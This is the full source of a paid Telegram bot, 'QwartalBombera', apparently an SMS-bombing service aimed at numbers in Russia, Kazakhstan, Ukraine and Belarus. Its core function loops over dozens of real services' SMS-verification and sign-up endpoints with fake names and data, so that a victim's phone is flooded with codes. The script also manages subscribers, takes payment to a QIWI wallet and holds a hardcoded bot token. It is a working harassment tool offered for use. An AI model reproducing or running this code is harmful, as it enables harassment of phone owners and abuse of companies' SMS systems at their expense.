# -*- coding: utf-8 -*-
import requests
import threading
from threading import Timer
from datetime import datetime, timedelta
from telebot import TeleBot
from threading import Thread
import telebot
import random, datetime, time
from telebot import types
from time import time
from fake_useragent import UserAgent
import re
import os
ua = UserAgent()

banner = """
- Более 120+ сервисов

- Спам на многие страны (в основном Россия, Казахстан, Украина и Беларусь)

<b>Скидка на подписку
>> 25р</b>
"""

TOKEN = '1953308157:AAGSQTeNftGEtk-eFOHfc4CjYtMD1abuYek' #1953308157:AAGSQTeNftGEtk-eFOHfc4CjYtMD1abuYek

THREADS_LIMIT = 100000

wl_file = 'numWL.txt'

chat_ids_file = 'vip_id.txt'

vip_id_file = 'vip_id.txt'

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []

def addwl(message):
    try:
        if str(message.text) in open('numWL.txt').read():
            bot.send_message(message.chat.id, f"Номер {message.text} - уже есть в белом листе")
        else:
            f = open('numWL.txt', 'a')
            f.write(str(message.text) + '\n')
            bot.send_message(message.chat.id, f"Номер {message.text} - успешно добавлен в белый лист")
    except:
        bot.send_message(message.chat.id, "Ошибка! Вы ввели не номер!")

def delllwl(message):
	with open("numWL.txt", "r") as f:
		lines = f.readlines()
	with open("numWL.txt", "w") as f:
		for line in lines:
			if line.strip("\n") != message.text:
				f.write(line)
	bot.send_message(message.chat.id, f"Пользователь {message.text} - успешно удален из базы")

def send(url,data,headers):
    try:
        print(requests.post(url,data=data,headers=headers))
    except:
        print("<Request Error>")

def user(id):
    f = open(vip_id_file,'r')
    if str(id) in f.read():
        return "1"
    else:
        pass

def delluser(message):
    with open("vip_id.txt", "r") as f:
        lines = f.readlines()
    with open("vip_id.txt", "w") as f:
        for line in lines:
            if line.strip("\n") != message.text:
                f.write(line)
    bot.send_message(message.chat.id, f"Пользователь {message.text} - успешно удален из базы")
    bot.send_message(message.text, f"Вам запрещён доступ к боту.")

def adduser(message):
    try:
        if str(message.text) in open('vip_id.txt').read():
            bot.send_message(message.chat.id, f"Пользователь {message.text} - уже есть в базе")

        else:
            f = open('vip_id.txt', 'a')
            f.write(str(message.text) + '\n')
            bot.send_message(message.chat.id, f"Пользователь {message.text} - успешно добавлен в базу")
            bot.send_message(message.text, f'Спасибо за покупку - напишите /start\n\nУдачного пользования, и не шалите!')
    except:
        bot.send_message(message.chat.id, "Ошибка! Вы ввели не айди юзера")

def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return

def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(vip_id_file, "r") as vip_file:
        vip_list = [line.split('\n')[0] for line in vip_file]

    [send_message(chat_id) for chat_id in vip_list]

@bot.message_handler(commands=["start"])
def start(m):
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="🔱FLOODING🔱", callback_data="button1")
    button3 = types.InlineKeyboardButton(text="⚙️Настройки", callback_data="button2")
    adminka = types.InlineKeyboardButton(text="Админка", callback_data="adminka1")

    if str(m.chat.id) in open('adm.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        keyboard.add(adminka)
        bot.send_message(m.chat.id, f'<b>✴QwartalBombera✴\n\n</b>⚠️Вы вошли в админку бота!\n<b>Ваш ID: {m.chat.id}\n\nВыберите действие: </b>', reply_markup = keyboard, parse_mode='HTML')
    
    elif str(m.chat.id) in open('vip_id.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        bot.send_message(m.chat.id, f'<b>✴QwartalBombera✴\n\n</b>Вы имеете доступ к приватному боту.\n<b>Ваш ID: {m.chat.id}\n\nВыберите действие: </b>', reply_markup = keyboard, parse_mode='HTML')
    else:
        keyboard = types.InlineKeyboardMarkup()
        button5 = types.InlineKeyboardButton(text="Получить доступ", callback_data="button5")
        keyboard.add(button5)
        bot.send_message(m.chat.id, '<b>✴QwartalBombera✴</b>\n\n❗️ У вас отсутствует платная подписка на бота. Чтобы ее приобрести нажмите кнопку 👉🏻Получить доступ👈🏻.',  reply_markup=keyboard, parse_mode='HTML')

def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)
    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="Остановить спам", callback_data="button3")
    keyboard.add(button1)
    if "1" == user(chat_id):
        msg = f'⚠Спам запущен на 7 дней для номера -> +{phone_number}!'
        bot.send_message(chat_id, msg, reply_markup=keyboard)
        while chat_id in running_spams_per_chat_id:
            send_for_number(phone_number)

        THREADS_AMOUNT[0] -= 1
        try:
            running_spams_per_chat_id.remove(chat_id)
        except Exception:
            pass
        
    else:
        msg = f'<b>⚠Спам запущен на 7 дней для номера -> +{phone_number}!</b>'

        bot.send_message(chat_id, msg, reply_markup=keyboard, parse_mode='HTML')
        end = datetime.now() + timedelta(minutes = 1)

        while datetime.now() < end and chat_id in running_spams_per_chat_id:
            send_for_number(phone_number)    
        try:
            running_spams_per_chat_id.remove(chat_id)
        except Exception:
            pass

def send_for_number(_phone):
    if _phone[0] == '+':
        _phone = _phone[1:]
    if _phone[0] == '8':
        _phone = '7'+_phone[1:]
    if _phone[0] == '9':
        _phone = '7'+_phone
    
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    iteration = 0
    phone = _phone
    _phone9 = _phone[1:]
    _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
    _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
    _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
    _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
    _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
    _phone = _phone
    _email = _name+f'{iteration}'+'@gmail.com'
    email = _name+f'{iteration}'+'@gmail.com'
    request_timeout = 0.00001
    while True:
        phone1 = '+'+phone[0]+' '+'('+phone[1]+phone[2]+phone[3]+')'+" "+phone[4]+phone[5]+phone[6]+'-'+phone[7]+phone[8]+'-'+phone[9]+phone[10]
        phone2 = phone[1] + phone[2] + phone[3] + phone[4] + phone[5] + phone[6] + phone[7] + phone [8] + phone[9] + phone[10] 
        
        try:    
         requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone})
        except Exception as e:
         pass
       
        try:                                                
         requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone})
        except Exception as e:
         pass
       
        try:    
         requests.post("https://api.mtstv.ru/v1/users", data={'msisdn': phone})
        except Exception as e:
         pass
       
        try:
         a=requests.get('https://driver.gett.ru/signup/')
         requests.post('https://driver.gett.ru/api/login/phone/', data = {'phone':phone,'registration':'true'}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'csrftoken='+a.cookies['csrftoken']+'; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2','Host':'driver.gett.ru (http://driver.gett.ru/)','Referer':'https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0 (https://driver.gett.ru/signup/','User-Agent':'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-CSRFToken':a.cookies['csrftoken']})
        except Exception as e:
         pass
       
        try:    
         requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data = {"phone":phone}, headers = {'Accept-Language':'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection':'keep-alive', 'Host':'api.ivi.ru (http://api.ivi.ru/)', 'origin':'https://www.ivi.ru/','Referer':'https://www.ivi.ru/profile (https://www.ivi.ru/','Referer':'https://www.ivi.ru/profile)'})
        except:
         pass
       
       
        try:
         b = requests.session()
         b.get('https://drugvokrug.ru/siteActions/processSms.htm')
         requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data = {'cell':phone}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'JSESSIONID='+b.cookies['JSESSIONID']+';','Host':'drugvokrug.ru (http://drugvokrug.ru/)','Referer':'https://drugvokrug.ru/','User-Agent':'Mozilla/5.0 (https://drugvokrug.ru/','User-Agent':'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
        except Exception as e:
         pass
       
       
       
        #Добавленые сервисы
        try:
         rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone[1:]})
        except Exception as e:
         pass
       
         
        try:
         rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})
        except Exception as e:
         pass
       
         
        try:
         psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone[1:],'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        except Exception as e:
         pass
         
       
         
        try:
         beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
        except Exception as e:
         pass
         
       
        try:
         modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone', json={'FirstName':'Саша','CellPhone':phone[1:],'Package':'optimal'})
        except Exception as e:
         pass
       
        try:
         data = {
       
        'form[NAME]': 'Иван',
        'form[PERSONAL_GENDER]': 'M',
        'form[PERSONAL_BIRTHDAY]': '11.02.2000',
        'form[EMAIL]': 'fbhbdfvbd@gmail.com',
        'form[LOGIN]': phone1,
        'form[PASSWORD]': None,
        'get-new-password': 'Получите пароль по SMS',
        'user_agreement': 'on',
        'personal_data_agreement': 'on',
        'formType': 'full',
        'utc_offset': 180}
        
         aptkru = requests.post('https://apteka.ru/_action/auth/getForm/', data = data)
        except Exception as e:
         pass
       
        try:
         tvzavr = requests.post('https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone='+phone+'&csrf_value=a222ba2a464543f5ac6ad097b1e92a49 (https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone=%27+phone+%27&csrf_value=a222ba2a464543f5ac6ad097b1e92a49)')
        except Exception as e:
         pass
       
       
        try:
         cook = requests.post('https://www.netprint.ru/order/profile')
       
       
         headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Length': 145,
        'Cookie':'unbi='+cook.cookies['unbi'],
        'Host': 'www.netprint.ru',
        'Origin': 'https://www.netprint.ru',
        'Referer': 'https://www.netprint.ru/order/profile',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48',
        'X-Requested-With': 'XMLHttpRequest'}
        
       
         netprint = requests.post('https://www.netprint.ru/order/social-auth', headers = headers,   data = {'operation': 'stdreg','email_or_phone': phonew, 'i_agree_with_terms': 1})
       
        except Exception as e:
         pass
       
        try:
         requests.post('http://youdrive.today/login/web/phone', data = {'phone':phone, 'phone_code': 7})
        except Exception as e:
         pass
       
        try:
         requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone+'&country_code=%2B7&nod=4&locale=en')
        except Exception as e:
         pass
       
       
        try:
         requests.post("https://api.carsmile.com/",
                                      json={"operationName": "enterPhone", "variables": {"phone": phone},
                                            "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        except Exception as e:
         pass
       
       
        try:
         requests.post("https://api.delitime.ru/api/v2/signup",
                                      data={"SignupForm[username]":phone, "SignupForm[device_type]": 3})
        except Exception as e:
         pass
       
       
        try:
         requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                                      data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru',
                                            'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        except Exception as e:
         pass
       
        try:
         requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                                      data={"mode": "request", "phone": "+" + phone,
                                            "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6",
                                            "osversion": "unknown", "devicemodel": "unknown"})
        except Exception as e:
         pass
       
        try:
         password = ''.join(random.choice(string.ascii_letters) for _ in range(6))
         requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + phone})
        except Exception as e:
         pass
       
        try:
         requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',
                                      json={"phone": phone})
        except Exception as e:
         pass
       
        try:
         requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
        except Exception as e:
         pass
       
        try:
         requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
        except Exception as e:
         pass
       
        try:
         requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                                      json={"phone": "+" + phone, "api": 2, "email": "email",
                                            "x-email": "x-email"})
        except Exception as e:
         pass
       
        try:
         requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                                      data={"st.r.phone": "+" + phone})
        except Exception as e:
         pass
        
        try:
         requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                                      json={"phone": phone})
        except Exception as e:
         pass
       
        try:
         requests.post("https://api.wowworks.ru/v2/site/send-code",
                                      json={"phone": phone, "type": 2})
        except Exception as e:
         pass
       
        try:
         requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                                      json={"phone_number": "+" + phone})
        except Exception as e:
         pass
       
        try:
         topPHONE = '+'+phone[0]+'('+phone[1]+phone[2]+phone[3]+')'+phone[4]+phone[5]+phone[6]+'-'+phone[7]+phone[8]+'-'+phone[9]+phone[10]
         topshop = requests.post('https://www.top-shop.ru/login/loginByPhone/', data = {'phone': topPHONE})
        except Exception as e:
         pass

        try:
         try:
          requests.get(f'https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&callmode=1&phone=%2B{phone}')
         except:
          requests.get(f'https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=12&callmode=1&lang=ru&phone={phone}')
        except:
         pass



def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите "Остановить спам" и поробуйте снова!')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        if phone not in open(wl_file).read():
            x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
            threads.append(x)
            THREADS_AMOUNT[0] += 1
            x.start()
        else:
            bot.send_message(chat_id, "Данный номер телефона находится в Белом листе. Вы не сможете отправить на него спам. Попробуйте другой номер.\n\nУбрать номер со списка, возможно - через @couldistin")
    else:
        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут!')
        print('Максимальное количество тредов исполняется. Действие отменено!')

@bot.message_handler(content_types=['text'])
def handle_message_received(message):

#############################################################################################
    chat_id = int(message.chat.id)
    text = message.text
    if 'РАЗОСЛАТЬ: ' in text and str(chat_id) in open('adm.txt').read():
        msg = text.replace("РАЗОСЛАТЬ: ","")
        send_message_users(msg)

    elif len(text) == 11 and str(chat_id) in open('vip_id.txt').read():
        phone = text
        spam_handler(phone, chat_id, force=False)
    elif len(text) == 12 and str(chat_id) in open('vip_id.txt').read():
        phone = text
        spam_handler(phone, chat_id, force=False)
    else:
        bot.send_message(chat_id, 'Номер введен неправильно.')

@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    message = call.message





    keyboard = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(text="🔱FLOODING🔱", callback_data="button1")
    button3 = types.InlineKeyboardButton(text="⚙️Настройки", callback_data="button2")
    adminka = types.InlineKeyboardButton(text="Админка", callback_data="adminka1")

    if str(message.chat.id) in open('adm.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        keyboard.add(adminka)
        bot.send_message(message.chat.id, f'<b>✴QwartalBombera✴\n\n</b>⚠️Вы вошли в админку бота!\n<b>Ваш ID: {message.chat.id}\n\nВыберите действие: </b>', reply_markup = keyboard, parse_mode='HTML')
    
    elif str(message.chat.id) in open('vip_id.txt').read():
        keyboard.add(button1)
        keyboard.add(button3)
        bot.send_message(message.chat.id, f'<b>✴QwartalBombera✴\n\n</b>Вы имеете доступ к приватному боту.\n<b>Ваш ID: {message.chat.id}\n\nВыберите действие: </b>', reply_markup = keyboard, parse_mode='HTML')
    else:
        keyboard = types.InlineKeyboardMarkup()
        button5 = types.InlineKeyboardButton(text="Получить доступ", callback_data="button5")
        keyboard.add(button5)
        bot.send_message(message.chat.id, '<b>✴QwartalBombera✴</b>\n\n❗️ У вас отсутствует приватная версия бота. Чтобы ее приоберсти нажмите кнопка 👉🏻Получить доступ👈🏻.',  reply_markup=keyboard, parse_mode='HTML')
##########################################################################################
    if call.message:
        if call.data == "button1":
            bot.send_message(message.chat.id, '<b>Введите номер без + в формате</b>:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx\n🇰🇿 77xxxxxxxxx\n🇧🇾 375xxxxxxxxx', parse_mode='HTML')
        elif call.data == "button3":
            if message.chat.id not in running_spams_per_chat_id:
                bot.send_message(message.chat.id, 'Вы еще не начинали спам.')
                start(message)
            else:
                running_spams_per_chat_id.remove(message.chat.id)
                bot.send_message(message.chat.id, 'Cпам успешно остановлен.')
                start(message)
##########################################################################################
        elif call.data == "button2":
            settings = types.InlineKeyboardMarkup()
            button7 = types.InlineKeyboardButton(text="Добавить номер в белый лист", callback_data="button7")
            button8 = types.InlineKeyboardButton(text="Информация", callback_data="button8")
            button9 = types.InlineKeyboardButton(text="Обновить", callback_data="button9")
            button10 = types.InlineKeyboardButton(text="Назад", callback_data="button10")

            settings.add(button7)
            settings.add(button8)
            settings.add(button9)
            settings.add(button10)
            bot.send_message(message.chat.id, f"Настройки бота. Выберите действие:", reply_markup=settings)

        elif call.data == 'button8':
            bot.send_message(message.chat.id, banner, parse_mode='HTML')

        elif call.data == 'button9':
            start(message)

        elif call.data == 'button7':
            lol = bot.send_message(message.chat.id, "Введите номер, который хотите добавить в белый лист.")
            bot.register_next_step_handler(lol, addwl)

        elif call.data == 'button10':
            bot.send_message(message.chat.id, 'Вы вернулись в главное меню.')
            start(message)
##########################################################################################
        elif call.data == 'adminka1':
            admm = types.InlineKeyboardMarkup()
            addpol = types.InlineKeyboardButton(text="Добавить пользователя", callback_data="button20")
            delpol = types.InlineKeyboardButton(text="Удалить пользователя", callback_data="button21")
            addwll = types.InlineKeyboardButton(text="Добавить номер в Белый лист", callback_data="button22")
            delwll = types.InlineKeyboardButton(text="Удалить номер с Белого листа", callback_data="button23")
            rassl = types.InlineKeyboardButton(text="Рассылка", callback_data="button24")
            oblov = types.InlineKeyboardButton(text="Обновить бота", callback_data="button25")
            backb = types.InlineKeyboardButton(text="Вернуться назад", callback_data="button26")


            admm.add(addpol, delpol)
            admm.add(addwll, delwll)
            admm.add(rassl, oblov)
            admm.add(backb)
            bot.send_message(message.chat.id, f"Админка бота. Выберите действие:", reply_markup=admm)

        elif call.data == 'button20':
            a = bot.send_message(message.chat.id, 'Введите id пользователя, которого хотите добавить в базу.')
            bot.register_next_step_handler(a, adduser)

        elif call.data == 'button21':
            b = bot.send_message(message.chat.id, 'Введите id пользователя, которого хотите удалить с базы.')
            bot.register_next_step_handler(b, delluser)

        elif call.data == 'button22':
            ww = bot.send_message(message.chat.id, "Введите номер, который вы хотите добавить в Белый лист.")
            bot.register_next_step_handler(ww, addwl)

        elif call.data == 'button23':
            ww = bot.send_message(message.chat.id, "Введите номер, который вы хотите удалить с Белого листа.")
            bot.register_next_step_handler(ww, delllwl)

        elif call.data == 'button24':
            bot.send_message(message.chat.id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

        elif call.data == 'button25':
            bot.send_message(message.chat.id, 'Бот перезапускается...')
            os.system('python start.py')

        elif call.data == 'button26':
            bot.send_message(message.chat.id, 'Выберите действие', reply_markup = keyboard)


##########################################################################################

        elif call.data == "button5":
            bot.send_message(message.chat.id, '❗️ Для приобретения доступа к боту переведите '+str(price) +' рублей на QIWI кошелёк любым способом.\n\n📱Номер телефона: ' + '<pre>' +qiwi_phone+'</pre> \n👑Комментарий: ' '<pre>'+str(message.chat.id)+'</pre> \n\nЕсли Вы перевели деньги с другим комментариями, то доступ вы не получите!\nПосле пополнения баланса введите /start\n\n<b>При ошибочном переводе писать @couldistin</b>', parse_mode = 'HTML')

bot.polling(none_stop=True)